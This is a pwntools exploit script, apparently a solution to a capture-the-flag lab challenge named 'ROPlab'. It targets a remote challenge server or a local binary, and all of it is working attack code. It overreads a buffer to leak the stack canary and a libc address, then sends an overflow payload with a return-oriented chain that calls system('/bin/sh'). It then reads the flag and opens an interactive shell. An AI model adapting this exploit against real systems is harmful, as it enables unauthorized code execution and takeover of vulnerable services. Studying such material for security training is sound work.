#!/usr/bin/python3

from pwn import * 
import sys


if len(sys.argv) > 1:
    r = remote('140.112.31.97', 30102)
else:
    r = process('./ROPlab')

libc = ELF('./libc-2.29.so')

#### leak canary
r.send(b'A'*0x19)
r.recvuntil('A'*0x19)
canary = u64(b'\x00'+r.recv(7))
log.info('canary:  {}'.format(hex(canary)))

#### leak libc
r.send(b'A'*0x28)
r.recvuntil('A'*0x28)
libc_base = u64(r.recv(6)+b'\x00\x00') - 235 - libc.symbols['__libc_start_main']
log.info('libc_base:  {}'.format(hex(libc_base)))

#### ROP
pop_rdi_ret = 0x0000000000026542 + libc_base
pop_rdx_rsi_ret = 0x000000000012bdc9 + libc_base
pop_rax_ret = 0x0000000000047cf8 + libc_base
syscall = 0x0000000000026bd4 + libc_base
binsh = 0x00000000001afb84 + libc_base
system = libc.symbols['system'] + libc_base
ret = 0x000000000002535f + libc_base

#ROP = [pop_rdi_ret, binsh, pop_rdx_rsi_ret, 0, 0, pop_rax_ret, 0x3b, syscall]
ROP = [pop_rdi_ret, binsh, ret, system]
ROP = b''.join(list(map(p64, ROP)))
input()
r.sendafter('Any additional remarks?', b'A'*0x18 + p64(canary) + b'A'*0x8 + ROP)
r.sendline('cat /home/`whoami`/flag')
r.interactive()
